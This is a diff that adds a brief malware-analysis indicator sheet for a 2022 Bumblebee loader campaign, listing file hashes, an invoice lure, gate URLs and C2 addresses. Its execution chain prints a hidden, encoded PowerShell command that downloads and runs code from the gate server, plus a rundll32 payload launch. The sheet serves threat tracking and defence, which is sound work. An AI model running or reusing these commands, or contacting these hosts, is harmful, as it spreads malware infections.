@@ -1,0 +1,41 @@
+Bumblebee | 19.09.2022 | 1909 |
+
+***************************************
+
+.iso 57806aeee21b97eeca9a2c758b524698bb117d54356bf62f1cd034ae1d02538a - Invoice_6-27-241
+.dll 90576eb6754dd1c38fb4cea4bf3f029535900436a02caee891c057c01ca84941
+
+***************************************
+
+lnk target:
+
+C:\dew\engaged.bat
+
+***************************************
+
+Exec >> 
+
+cmd.exe /c "C:\Users\Admin\AppData\Local\Temp\dew\engaged.bat"
+
+powershell  -w hidden -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBlAGUAcgBvAG4AaQB4AHQALgBjAG8AbQAvAGcAYQB0AGUAIgApAA==
+
+rundll32.exe C:\Users\Admin\AppData\Local\mIOPiX.bin,CreateTask
+
+WerFault.exe -u -p 2300 -s 272
+
+***************************************
+
+rc4.plain - vdQJYecLrw
+
+***************************************
+
+.dll
+
+http://meeronixt.com/gate/
+http://meeronixt.com/gate/dll/12.dll
+
+c2's
+
+108.177.235.29:443
+23.106.160.117:443
+23.106.215.133:443
